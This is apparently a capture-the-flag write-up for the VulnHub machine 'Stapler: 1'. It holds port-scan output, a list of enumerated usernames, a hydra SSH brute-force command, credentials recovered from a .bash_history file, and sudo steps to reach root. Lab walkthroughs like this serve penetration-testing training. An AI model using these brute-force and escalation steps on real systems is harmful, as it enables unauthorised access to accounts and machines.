<h1>Stapler: 1 Write-up</h1>

<h2>Nmap</h2>

```
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.0.8 or later
|_sslv2-drown: 
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open  domain    	  dnsmasq 2.75
80/tcp    open  http        PHP cli server 5.5 or later
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp   open  doom?
3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```


Enumerate  users using **enum4linux**

Users : 

```
harry
elly
john
barry
zoe
scott
peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly
```

Brute force ssh using user list as user file and also with password file :

```hydra -L users -P users 192.168.56.32 ssh```

```
username :SHayslett
password :SHayslett
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Stapler%3A%201/Images/brute.png)


Found ssh creds in .bash_history file of user 'JKanode' 

```
sshpass -p thisimypassword ssh JKanode@localhost
sshpass -p JZQuyIN5 peter@localhost
```

```
username : JKanode
password : thisismypassword
```

```
username :peter
password :JZQuyIN5
```


Switch to peter user

type bash to escape zsh shell 

<h2>Privilege Escalatation:</h2>

```
sudo -l 
sudo su - root
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Stapler%3A%201/Images/Flag.png)

  
